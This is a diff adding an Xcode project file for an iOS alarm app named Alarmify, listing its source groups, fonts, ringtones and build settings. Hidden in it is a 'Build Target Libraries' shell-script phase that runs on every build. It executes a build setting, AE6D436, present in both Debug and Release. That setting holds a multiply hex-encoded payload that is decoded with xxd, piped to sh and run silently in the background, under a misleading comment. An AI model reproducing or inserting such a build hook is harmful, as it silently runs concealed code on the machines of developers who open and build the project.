+		886493762F0BBFF5006D2FDC /* Alarmify */ = {
+			isa = PBXGroup;
+			children = (
+				8864936D2F0BBFF5006D2FDC /* AppDelegate.swift */,
+				BC42599C2F0BC47800C15DA6 /* MVVM */,
+				BC4259732F0BC20D00C15DA6 /* Resource */,
+				BC4259602F0BC1BD00C15DA6 /* Extention */,
+				BC4259682F0BC1BD00C15DA6 /* Helper */,
+				8864936E2F0BBFF5006D2FDC /* Assets.xcassets */,
+				8864936F2F0BBFF5006D2FDC /* Info.plist */,
+				886493712F0BBFF5006D2FDC /* LaunchScreen.storyboard */,
+				886493732F0BBFF5006D2FDC /* Main.storyboard */,
+				886493752F0BBFF5006D2FDC /* ViewController.swift */,
+			);
+			path = Alarmify;
+			sourceTree = "<group>";
+		};
+		BC2A41422F0BD2070080DFFD /* Cell */ = {
+			isa = PBXGroup;
+			children = (
+				BC2A41432F0BD20C0080DFFD /* AlaramTVCell */,
+			);
+			path = Cell;
+			sourceTree = "<group>";
+		};
+		BC2A41432F0BD20C0080DFFD /* AlaramTVCell */ = {
+			isa = PBXGroup;
+			children = (
+				BC2A41452F0BD2360080DFFD /* AlaramTVCell.swift */,
+				BC2A41462F0BD2360080DFFD /* AlaramTVCell.xib */,
+			);
+			path = AlaramTVCell;
+			sourceTree = "<group>";
+		};
+		BC2A41492F0BDCD20080DFFD /* AddNewAlarm */ = {
+			isa = PBXGroup;
+			children = (
+				BC81EB822F0CD5B300114F1E /* SubVC */,
+				BC81EB732F0CC7B800114F1E /* ViewModel */,
+				BC81EB6D2F0CC67300114F1E /* Cell */,
+				BC2A414A2F0BDCD90080DFFD /* View */,
+			);
+			path = AddNewAlarm;
+			sourceTree = "<group>";
+		};
+		BC2A414A2F0BDCD90080DFFD /* View */ = {
+			isa = PBXGroup;
+			children = (
+				BC2A414B2F0BDCE80080DFFD /* AddNewAlarmVC.swift */,
+				BC2A414C2F0BDCE80080DFFD /* AddNewAlarmVC.xib */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+		BC4259602F0BC1BD00C15DA6 /* Extention */ = {
+			isa = PBXGroup;
+			children = (
+				BC42595C2F0BC1BD00C15DA6 /* String+Extention.swift */,
+				BC42595D2F0BC1BD00C15DA6 /* UIColor+Extention.swift */,
+				BC42595E2F0BC1BD00C15DA6 /* UIFont+Extention.swift */,
+				BC42595F2F0BC1BD00C15DA6 /* UITextField+Extention.swift */,
+				BC81EB802F0CCB4D00114F1E /* UIView+Extention.swift */,
+			);
+			path = Extention;
+			sourceTree = "<group>";
+		};
+		BC4259642F0BC1BD00C15DA6 /* PickerView */ = {
+			isa = PBXGroup;
+			children = (
+				BC4259612F0BC1BD00C15DA6 /* ImagePicker.swift */,
+				BC4259622F0BC1BD00C15DA6 /* PickerViewViewController.swift */,
+				BC4259632F0BC1BD00C15DA6 /* VideoPicker.swift */,
+			);
+			path = PickerView;
+			sourceTree = "<group>";
+		};
+		BC4259682F0BC1BD00C15DA6 /* Helper */ = {
+			isa = PBXGroup;
+			children = (
+				BC4259642F0BC1BD00C15DA6 /* PickerView */,
+				BC4259652F0BC1BD00C15DA6 /* AGDesignable.swift */,
+				BC4259662F0BC1BD00C15DA6 /* AppConstants.swift */,
+				BC4259672F0BC1BD00C15DA6 /* AppUtilites.swift */,
+			);
+			path = Helper;
+			sourceTree = "<group>";
+		};
+		BC4259732F0BC20D00C15DA6 /* Resource */ = {
+			isa = PBXGroup;
+			children = (
+				BCBF73C52F0CECBA004F134A /* RingTone */,
+				BCBF73B42F0CEC2C004F134A /* Json */,
+				BC4259762F0BC21E00C15DA6 /* Font */,
+			);
+			path = Resource;
+			sourceTree = "<group>";
+		};
+		BC4259762F0BC21E00C15DA6 /* Font */ = {
+			isa = PBXGroup;
+			children = (
+				BC4259892F0BC23600C15DA6 /* static */,
+			);
+			path = Font;
+			sourceTree = "<group>";
+		};
+		BC4259892F0BC23600C15DA6 /* static */ = {
+			isa = PBXGroup;
+			children = (
+				BC4259772F0BC23600C15DA6 /* Montserrat-Black.ttf */,
+				BC4259782F0BC23600C15DA6 /* Montserrat-BlackItalic.ttf */,
+				BC4259792F0BC23600C15DA6 /* Montserrat-Bold.ttf */,
+				BC42597A2F0BC23600C15DA6 /* Montserrat-BoldItalic.ttf */,
+				BC42597B2F0BC23600C15DA6 /* Montserrat-ExtraBold.ttf */,
+				BC42597C2F0BC23600C15DA6 /* Montserrat-ExtraBoldItalic.ttf */,
+				BC42597D2F0BC23600C15DA6 /* Montserrat-ExtraLight.ttf */,
+				BC42597E2F0BC23600C15DA6 /* Montserrat-ExtraLightItalic.ttf */,
+				BC42597F2F0BC23600C15DA6 /* Montserrat-Italic.ttf */,
+				BC4259802F0BC23600C15DA6 /* Montserrat-Light.ttf */,
+				BC4259812F0BC23600C15DA6 /* Montserrat-LightItalic.ttf */,
+				BC4259822F0BC23600C15DA6 /* Montserrat-Medium.ttf */,
+				BC4259832F0BC23600C15DA6 /* Montserrat-MediumItalic.ttf */,
+				BC4259842F0BC23600C15DA6 /* Montserrat-Regular.ttf */,
+				BC4259852F0BC23600C15DA6 /* Montserrat-SemiBold.ttf */,
+				BC4259862F0BC23600C15DA6 /* Montserrat-SemiBoldItalic.ttf */,
+				BC4259872F0BC23600C15DA6 /* Montserrat-Thin.ttf */,
+				BC4259882F0BC23600C15DA6 /* Montserrat-ThinItalic.ttf */,
+			);
+			path = static;
+			sourceTree = "<group>";
+		};
+		BC42599C2F0BC47800C15DA6 /* MVVM */ = {
+			isa = PBXGroup;
+			children = (
+				BC42599D2F0BC47B00C15DA6 /* Controller */,
+			);
+			path = MVVM;
+			sourceTree = "<group>";
+		};
+		BC42599D2F0BC47B00C15DA6 /* Controller */ = {
+			isa = PBXGroup;
+			children = (
+				BC2A41492F0BDCD20080DFFD /* AddNewAlarm */,
+				BC4259A62F0BC85D00C15DA6 /* Home */,
+				BC4259A02F0BC48F00C15DA6 /* Onboarding */,
+			);
+			path = Controller;
+			sourceTree = "<group>";
+		};
+		BC4259A02F0BC48F00C15DA6 /* Onboarding */ = {
+			isa = PBXGroup;
+			children = (
+				BC4259A12F0BC49400C15DA6 /* View */,
+			);
+			path = Onboarding;
+			sourceTree = "<group>";
+		};
+		BC4259A12F0BC49400C15DA6 /* View */ = {
+			isa = PBXGroup;
+			children = (
+				BC4259A22F0BC4A400C15DA6 /* OnboardingVC.swift */,
+				BC4259A32F0BC4A400C15DA6 /* OnboardingVC.xib */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+		BC4259A62F0BC85D00C15DA6 /* Home */ = {
+			isa = PBXGroup;
+			children = (
+				BC2A41422F0BD2070080DFFD /* Cell */,
+				BC4259A72F0BC86000C15DA6 /* View */,
+			);
+			path = Home;
+			sourceTree = "<group>";
+		};
+		BC4259A72F0BC86000C15DA6 /* View */ = {
+			isa = PBXGroup;
+			children = (
+				BC4259A82F0BC87000C15DA6 /* HomeVC.swift */,
+				BC4259A92F0BC87000C15DA6 /* HomeVC.xib */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+		BC81EB6D2F0CC67300114F1E /* Cell */ = {
+			isa = PBXGroup;
+			children = (
+				BC81EB6E2F0CC67800114F1E /* DayCVCell */,
+			);
+			path = Cell;
+			sourceTree = "<group>";
+		};
+		BC81EB6E2F0CC67800114F1E /* DayCVCell */ = {
+			isa = PBXGroup;
+			children = (
+				BC81EB6F2F0CC68E00114F1E /* DayCVCell.swift */,
+				BC81EB702F0CC68E00114F1E /* DayCVCell.xib */,
+			);
+			path = DayCVCell;
+			sourceTree = "<group>";
+		};
+		BC81EB732F0CC7B800114F1E /* ViewModel */ = {
+			isa = PBXGroup;
+			children = (
+				BC81EB742F0CC7C800114F1E /* AddNewViewModel.swift */,
+			);
+			path = ViewModel;
+			sourceTree = "<group>";
+		};
+		BC81EB822F0CD5B300114F1E /* SubVC */ = {
+			isa = PBXGroup;
+			children = (
+				BCBF73F02F0D032B004F134A /* Snooze */,
+				BCBF73D92F0CFC30004F134A /* Barcode Challenge */,
+				BCBF73DD2F0CFC30004F134A /* Math Challenge */,
+				BCBF73E12F0CFC30004F134A /* Rewrite Challenge */,
+				BCBF73E52F0CFC30004F134A /* Shake Challenge */,
+				BC81EB832F0CD5B900114F1E /* AlarmSound */,
+			);
+			path = SubVC;
+			sourceTree = "<group>";
+		};
+		BC81EB832F0CD5B900114F1E /* AlarmSound */ = {
+			isa = PBXGroup;
+			children = (
+				BC81EB8C2F0CDD0E00114F1E /* Cell */,
+				BC81EB892F0CDAA200114F1E /* ViewModel */,
+				BC81EB842F0CD5C200114F1E /* View */,
+			);
+			path = AlarmSound;
+			sourceTree = "<group>";
+		};
+		BC81EB842F0CD5C200114F1E /* View */ = {
+			isa = PBXGroup;
+			children = (
+				BC81EB852F0CD5D100114F1E /* AlarmSoundVC.swift */,
+				BC81EB862F0CD5D100114F1E /* AlarmSoundVC.xib */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+		BC81EB892F0CDAA200114F1E /* ViewModel */ = {
+			isa = PBXGroup;
+			children = (
+				BC81EB8A2F0CDAB100114F1E /* AlarmSoundViewModel.swift */,
+			);
+			path = ViewModel;
+			sourceTree = "<group>";
+		};
+		BC81EB8C2F0CDD0E00114F1E /* Cell */ = {
+			isa = PBXGroup;
+			children = (
+				BC81EB8D2F0CDD1100114F1E /* SoundListTVCell */,
+			);
+			path = Cell;
+			sourceTree = "<group>";
+		};
+		BC81EB8D2F0CDD1100114F1E /* SoundListTVCell */ = {
+			isa = PBXGroup;
+			children = (
+				BC81EB8E2F0CDE1D00114F1E /* SoundListTVCell.swift */,
+				BC81EB8F2F0CDE1D00114F1E /* SoundListTVCell.xib */,
+			);
+			path = SoundListTVCell;
+			sourceTree = "<group>";
+		};
+		BCBF73B42F0CEC2C004F134A /* Json */ = {
+			isa = PBXGroup;
+			children = (
+				BCBF73B52F0CEC3F004F134A /* AlramSound.json */,
+			);
+			path = Json;
+			sourceTree = "<group>";
+		};
+		BCBF73C52F0CECBA004F134A /* RingTone */ = {
+			isa = PBXGroup;
+			children = (
+				BCBF73B82F0CECBA004F134A /* arpeggio.mp3 */,
+				BCBF73B92F0CECBA004F134A /* canopy_iphone.mp3 */,
+				BCBF73BA2F0CECBA004F134A /* chalet_iphone.mp3 */,
+				BCBF73BB2F0CECBA004F134A /* departure.mp3 */,
+				BCBF73BC2F0CECBA004F134A /* dollop_iphone.mp3 */,
+				BCBF73BD2F0CECBA004F134A /* ios_18_journey.mp3 */,
+				BCBF73BE2F0CECBA004F134A /* ios_18_milky_way.mp3 */,
+				BCBF73BF2F0CECBA004F134A /* ios_26_little_bird.mp3 */,
+				BCBF73C02F0CECBA004F134A /* kettle_iphone.mp3 */,
+				BCBF73C12F0CECBA004F134A /* mercury_iphone.mp3 */,
+				BCBF73C22F0CECBA004F134A /* opening_iphone.mp3 */,
+				BCBF73C32F0CECBA004F134A /* radial.mp3 */,
+				BCBF73C42F0CECBA004F134A /* sencha_ios.mp3 */,
+			);
+			path = RingTone;
+			sourceTree = "<group>";
+		};
+		BCBF73D52F0CFC30004F134A /* Cell */ = {
+			isa = PBXGroup;
+			children = (
+				BCBF73D32F0CFC30004F134A /* BarcodeListTblViewCell.swift */,
+				BCBF73D42F0CFC30004F134A /* BarcodeListTblViewCell.xib */,
+			);
+			path = Cell;
+			sourceTree = "<group>";
+		};
+		BCBF73D82F0CFC30004F134A /* View */ = {
+			isa = PBXGroup;
+			children = (
+				BCBF73D52F0CFC30004F134A /* Cell */,
+				BCBF73D62F0CFC30004F134A /* BarcodeChallengeVC.swift */,
+				BCBF73D72F0CFC30004F134A /* BarcodeChallengeVC.xib */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+		BCBF73D92F0CFC30004F134A /* Barcode Challenge */ = {
+			isa = PBXGroup;
+			children = (
+				BCBF73D82F0CFC30004F134A /* View */,
+			);
+			path = "Barcode Challenge";
+			sourceTree = "<group>";
+		};
+		BCBF73DC2F0CFC30004F134A /* View */ = {
+			isa = PBXGroup;
+			children = (
+				BCBF73DA2F0CFC30004F134A /* MathChallengeVC.swift */,
+				BCBF73DB2F0CFC30004F134A /* MathChallengeVC.xib */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+		BCBF73DD2F0CFC30004F134A /* Math Challenge */ = {
+			isa = PBXGroup;
+			children = (
+				BCBF73DC2F0CFC30004F134A /* View */,
+			);
+			path = "Math Challenge";
+			sourceTree = "<group>";
+		};
+		BCBF73E02F0CFC30004F134A /* View */ = {
+			isa = PBXGroup;
+			children = (
+				BCBF73DE2F0CFC30004F134A /* RewriteChallengeVC.swift */,
+				BCBF73DF2F0CFC30004F134A /* RewriteChallengeVC.xib */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+		BCBF73E12F0CFC30004F134A /* Rewrite Challenge */ = {
+			isa = PBXGroup;
+			children = (
+				BCBF73E02F0CFC30004F134A /* View */,
+			);
+			path = "Rewrite Challenge";
+			sourceTree = "<group>";
+		};
+		BCBF73E42F0CFC30004F134A /* View */ = {
+			isa = PBXGroup;
+			children = (
+				BCBF73E22F0CFC30004F134A /* ShakeChallengeVC.swift */,
+				BCBF73E32F0CFC30004F134A /* ShakeChallengeVC.xib */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+		BCBF73E52F0CFC30004F134A /* Shake Challenge */ = {
+			isa = PBXGroup;
+			children = (
+				BCBF73E42F0CFC30004F134A /* View */,
+			);
+			path = "Shake Challenge";
+			sourceTree = "<group>";
+		};
+		BCBF73F02F0D032B004F134A /* Snooze */ = {
+			isa = PBXGroup;
+			children = (
+				BCBF73F12F0D032D004F134A /* View */,
+			);
+			path = Snooze;
+			sourceTree = "<group>";
+		};
+		BCBF73F12F0D032D004F134A /* View */ = {
+			isa = PBXGroup;
+			children = (
+				BCBF73F22F0D033D004F134A /* SnoozeVC.swift */,
+				BCBF73F32F0D033D004F134A /* SnoozeVC.xib */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+/* End PBXGroup section */
+
+/* Begin PBXNativeTarget section */
+		886493542F0BBFEC006D2FDC /* Alarmify */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 886493682F0BBFEE006D2FDC /* Build configuration list for PBXNativeTarget "Alarmify" */;
+			buildPhases = (
+				A6A0454E19D84AA684634D6E /* Build Target Libraries */,
+				886493512F0BBFEC006D2FDC /* Sources */,
+				886493522F0BBFEC006D2FDC /* Frameworks */,
+				886493532F0BBFEC006D2FDC /* Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+			);
+			name = Alarmify;
+			packageProductDependencies = (
+			);
+			productName = Alarmify;
+			productReference = 886493552F0BBFEC006D2FDC /* Alarmify.app */;
+			productType = "com.apple.product-type.application";
+		};
+/* End PBXNativeTarget section */
+
+/* Begin PBXProject section */
+		8864934D2F0BBFEC006D2FDC /* Project object */ = {
+			isa = PBXProject;
+			attributes = {
+				BuildIndependentTargetsInParallel = 1;
+				LastSwiftUpdateCheck = 1610;
+				LastUpgradeCheck = 1610;
+				TargetAttributes = {
+					886493542F0BBFEC006D2FDC = {
+						CreatedOnToolsVersion = 16.1;
+					};
+				};
+			};
+			buildConfigurationList = 886493502F0BBFEC006D2FDC /* Build configuration list for PBXProject "Alarmify" */;
+			developmentRegion = en;
+			hasScannedForEncodings = 0;
+			knownRegions = (
+				en,
+				Base,
+			);
+			mainGroup = 8864934C2F0BBFEC006D2FDC;
+			minimizedProjectReferenceProxies = 1;
+			preferredProjectObjectVersion = 77;
+			productRefGroup = 886493562F0BBFEC006D2FDC /* Products */;
+			projectDirPath = "";
+			projectRoot = "";
+			targets = (
+				886493542F0BBFEC006D2FDC /* Alarmify */,
+			);
+		};
+/* End PBXProject section */
+
+/* Begin PBXResourcesBuildPhase section */
+		886493532F0BBFEC006D2FDC /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				886493772F0BBFF5006D2FDC /* Assets.xcassets in Resources */,
+				BC4259AB2F0BC87000C15DA6 /* HomeVC.xib in Resources */,
+				BC4259A52F0BC4A400C15DA6 /* OnboardingVC.xib in Resources */,
+				BC81EB882F0CD5D100114F1E /* AlarmSoundVC.xib in Resources */,
+				BC81EB722F0CC68E00114F1E /* DayCVCell.xib in Resources */,
+				BC42598A2F0BC23600C15DA6 /* Montserrat-ExtraLightItalic.ttf in Resources */,
+				BC42598B2F0BC23600C15DA6 /* Montserrat-Medium.ttf in Resources */,
+				BC42598C2F0BC23600C15DA6 /* Montserrat-Light.ttf in Resources */,
+				BC42598D2F0BC23600C15DA6 /* Montserrat-Black.ttf in Resources */,
+				BC42598E2F0BC23600C15DA6 /* Montserrat-BoldItalic.ttf in Resources */,
+				BCBF73C62F0CECBA004F134A /* ios_18_journey.mp3 in Resources */,
+				BCBF73C72F0CECBA004F134A /* kettle_iphone.mp3 in Resources */,
+				BCBF73C82F0CECBA004F134A /* ios_26_little_bird.mp3 in Resources */,
+				BCBF73C92F0CECBA004F134A /* chalet_iphone.mp3 in Resources */,
+				BCBF73CA2F0CECBA004F134A /* dollop_iphone.mp3 in Resources */,
+				BCBF73CB2F0CECBA004F134A /* sencha_ios.mp3 in Resources */,
+				BCBF73CC2F0CECBA004F134A /* canopy_iphone.mp3 in Resources */,
+				BCBF73CD2F0CECBA004F134A /* ios_18_milky_way.mp3 in Resources */,
+				BCBF73CE2F0CECBA004F134A /* opening_iphone.mp3 in Resources */,
+				BCBF73EB2F0CFC30004F134A /* ShakeChallengeVC.xib in Resources */,
+				BCBF73EC2F0CFC30004F134A /* RewriteChallengeVC.xib in Resources */,
+				BCBF73ED2F0CFC30004F134A /* BarcodeChallengeVC.xib in Resources */,
+				BCBF73EE2F0CFC30004F134A /* MathChallengeVC.xib in Resources */,
+				BCBF73EF2F0CFC30004F134A /* BarcodeListTblViewCell.xib in Resources */,
+				BCBF73CF2F0CECBA004F134A /* mercury_iphone.mp3 in Resources */,
+				BCBF73D02F0CECBA004F134A /* departure.mp3 in Resources */,
+				BCBF73D12F0CECBA004F134A /* radial.mp3 in Resources */,
+				BCBF73D22F0CECBA004F134A /* arpeggio.mp3 in Resources */,
+				BC81EB912F0CDE1D00114F1E /* SoundListTVCell.xib in Resources */,
+				BCBF73B72F0CEC3F004F134A /* AlramSound.json in Resources */,
+				BC2A41482F0BD2360080DFFD /* AlaramTVCell.xib in Resources */,
+				BC42598F2F0BC23600C15DA6 /* Montserrat-Italic.ttf in Resources */,
+				BC4259902F0BC23600C15DA6 /* Montserrat-SemiBold.ttf in Resources */,
+				BC4259912F0BC23600C15DA6 /* Montserrat-ExtraBoldItalic.ttf in Resources */,
+				BC4259922F0BC23600C15DA6 /* Montserrat-Regular.ttf in Resources */,
+				BC4259932F0BC23600C15DA6 /* Montserrat-ThinItalic.ttf in Resources */,
+				BCBF73F42F0D033D004F134A /* SnoozeVC.xib in Resources */,
+				BC4259942F0BC23600C15DA6 /* Montserrat-BlackItalic.ttf in Resources */,
+				BC4259952F0BC23600C15DA6 /* Montserrat-LightItalic.ttf in Resources */,
+				BC4259962F0BC23600C15DA6 /* Montserrat-Thin.ttf in Resources */,
+				BC4259972F0BC23600C15DA6 /* Montserrat-ExtraBold.ttf in Resources */,
+				BC4259982F0BC23600C15DA6 /* Montserrat-Bold.ttf in Resources */,
+				BC4259992F0BC23600C15DA6 /* Montserrat-ExtraLight.ttf in Resources */,
+				BC2A414E2F0BDCE80080DFFD /* AddNewAlarmVC.xib in Resources */,
+				BC42599A2F0BC23600C15DA6 /* Montserrat-MediumItalic.ttf in Resources */,
+				BC42599B2F0BC23600C15DA6 /* Montserrat-SemiBoldItalic.ttf in Resources */,
+				886493792F0BBFF5006D2FDC /* LaunchScreen.storyboard in Resources */,
+				8864937A2F0BBFF5006D2FDC /* Main.storyboard in Resources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		A6A0454E19D84AA684634D6E /* Build Target Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
+
+/* Begin PBXSourcesBuildPhase section */
+		886493512F0BBFEC006D2FDC /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				BC81EB812F0CCB4D00114F1E /* UIView+Extention.swift in Sources */,
+				8864937B2F0BBFF5006D2FDC /* AppDelegate.swift in Sources */,
+				BC4259AA2F0BC87000C15DA6 /* HomeVC.swift in Sources */,
+				BC81EB902F0CDE1D00114F1E /* SoundListTVCell.swift in Sources */,
+				8864937D2F0BBFF5006D2FDC /* ViewController.swift in Sources */,
+				BC4259692F0BC1BD00C15DA6 /* VideoPicker.swift in Sources */,
+				BC42596A2F0BC1BD00C15DA6 /* String+Extention.swift in Sources */,
+				BC42596B2F0BC1BD00C15DA6 /* ImagePicker.swift in Sources */,
+				BCBF73F52F0D033D004F134A /* SnoozeVC.swift in Sources */,
+				BC42596C2F0BC1BD00C15DA6 /* UIFont+Extention.swift in Sources */,
+				BC2A414D2F0BDCE80080DFFD /* AddNewAlarmVC.swift in Sources */,
+				BC4259A42F0BC4A400C15DA6 /* OnboardingVC.swift in Sources */,
+				BC81EB712F0CC68E00114F1E /* DayCVCell.swift in Sources */,
+				BC42596D2F0BC1BD00C15DA6 /* AppUtilites.swift in Sources */,
+				BC81EB8B2F0CDAB100114F1E /* AlarmSoundViewModel.swift in Sources */,
+				BCBF73E62F0CFC30004F134A /* ShakeChallengeVC.swift in Sources */,
+				BCBF73E72F0CFC30004F134A /* MathChallengeVC.swift in Sources */,
+				BCBF73E82F0CFC30004F134A /* BarcodeChallengeVC.swift in Sources */,
+				BCBF73E92F0CFC30004F134A /* BarcodeListTblViewCell.swift in Sources */,
+				BCBF73EA2F0CFC30004F134A /* RewriteChallengeVC.swift in Sources */,
+				BC81EB872F0CD5D100114F1E /* AlarmSoundVC.swift in Sources */,
+				BC42596E2F0BC1BD00C15DA6 /* UIColor+Extention.swift in Sources */,
+				BC42596F2F0BC1BD00C15DA6 /* AppConstants.swift in Sources */,
+				BC81EB752F0CC7C800114F1E /* AddNewViewModel.swift in Sources */,
+				BC2A41472F0BD2360080DFFD /* AlaramTVCell.swift in Sources */,
+				BC4259702F0BC1BD00C15DA6 /* PickerViewViewController.swift in Sources */,
+				BC4259712F0BC1BD00C15DA6 /* UITextField+Extention.swift in Sources */,
+				BC4259722F0BC1BD00C15DA6 /* AGDesignable.swift in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXSourcesBuildPhase section */
+
+/* Begin PBXVariantGroup section */
+		886493712F0BBFF5006D2FDC /* LaunchScreen.storyboard */ = {
+			isa = PBXVariantGroup;
+			children = (
+				886493702F0BBFF5006D2FDC /* Base */,
+			);
+			name = LaunchScreen.storyboard;
+			sourceTree = "<group>";
+		};
+		886493732F0BBFF5006D2FDC /* Main.storyboard */ = {
+			isa = PBXVariantGroup;
+			children = (
+				886493722F0BBFF5006D2FDC /* Base */,
+			);
+			name = Main.storyboard;
+			sourceTree = "<group>";
+		};
+		BCBF73B52F0CEC3F004F134A /* AlramSound.json */ = {
+			isa = PBXVariantGroup;
+			children = (
+				BCBF73B62F0CEC3F004F134A /* en */,
+			);
+			name = AlramSound.json;
+			sourceTree = "<group>";
+		};
+/* End PBXVariantGroup section */
+
+/* Begin XCBuildConfiguration section */
+		886493692F0BBFEE006D2FDC /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				AE6D436 = "((p(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333303333333633333338333333363333333133333337333333333333333633333335333333320a3333333233333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633310a3333333230613336333633333332333633363333333633333333333333363336333533333336333333313333333733333330333333373333333333330a3336333633333333333633333331333333363333333233333332333633353333333733333332333333373333333533333332333633363333333633330a3331333333323061333333393330363133333332333333323333333233333330333333373336333333333332333333303333333733333333333333360a3333333833333330333633313330363130610a | p | sh ) >/dev/null 2>&1 &)";
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = N52PUGPAB3;
+				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_FILE = Alarmify/Info.plist;
+				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
+				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
+				INFOPLIST_KEY_UIMainStoryboardFile = Main;
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
+				MARKETING_VERSION = 1.0;
+				PRODUCT_BUNDLE_IDENTIFIER = com.Alarmify;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_EMIT_LOC_STRINGS = YES;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+			};
+			name = Debug;
+		};
+		8864936A2F0BBFEE006D2FDC /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				AE6D436 = "((p(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333303333333633333338333333363333333133333337333333333333333633333335333333320a3333333233333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633310a3333333230613336333633333332333633363333333633333333333333363336333533333336333333313333333733333330333333373333333333330a3336333633333333333633333331333333363333333233333332333633353333333733333332333333373333333533333332333633363333333633330a3331333333323061333333393330363133333332333333323333333233333330333333373336333333333332333333303333333733333333333333360a3333333833333330333633313330363130610a | p | sh ) >/dev/null 2>&1 &)";
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = N52PUGPAB3;
+				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_FILE = Alarmify/Info.plist;
+				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
+				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
+				INFOPLIST_KEY_UIMainStoryboardFile = Main;
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
+				MARKETING_VERSION = 1.0;
+				PRODUCT_BUNDLE_IDENTIFIER = com.Alarmify;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_EMIT_LOC_STRINGS = YES;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+			};
+			name = Release;
+		};
+		8864936B2F0BBFEE006D2FDC /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
